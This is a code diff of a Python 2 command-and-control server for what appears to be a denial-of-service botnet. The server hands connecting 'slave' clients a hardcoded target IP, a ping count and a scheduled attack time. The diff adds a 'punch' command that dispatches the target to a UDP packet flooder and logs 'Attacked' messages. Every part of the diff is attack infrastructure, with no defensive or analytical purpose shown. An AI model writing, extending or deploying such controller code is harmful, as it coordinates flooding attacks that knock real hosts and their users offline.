@@ -7,13 +7,14 @@ import time
 import datetime
 
 master='master'
-slave='slave'
+ping='slaveping'
+punch="slavepunch"
 global ipAdd
 global numPing
 global ping_time
 ipAdd ='198.252.11.70'
 numPing = 5
-ping_time = "2013-03-13-13-32-0"
+ping_time = "2013-03-27-21-05-0"
 
 def handler(clientsock,addr):
 	while 1:
@@ -34,13 +35,17 @@ def handler(clientsock,addr):
 				clientsock.send('\nConfirmed Number of Pings: "%s" ' % numPing)
 				clientsock.send('\nConfirmed Ping Time: "%s" ' % ping_time)
 				break
-			elif data == slave:
+			elif data == ping:
 				clientsock.send(ipAdd)
-				#time.sleep(2)
+				time.sleep(1)
 				clientsock.send(str(numPing))
-				#time.sleep(2)
-				print >>sys.stderr, 'Attacking %s with %s Pings' % (ipAdd, numPing)
+				time.sleep(1)
 				clientsock.send(str(ping_time))
+				print >>sys.stderr, 'Attacked %s with %s Pings' % (ipAdd, numPing)
+				break
+			elif data == punch:
+				clientsock.send(ipAdd)
+				print >>sys.stderr, 'Attacked %s with UDP Packet Blaster' % ipAdd
 				break
 			else:
 				print >>sys.stderr, 'Invalid Access From: ', clientsock
@@ -68,4 +73,3 @@ if __name__=='__main__':
 
 		print '\nConnection From: ', addr
 		thread.start_new_thread(handler, (clientsock, addr))
-
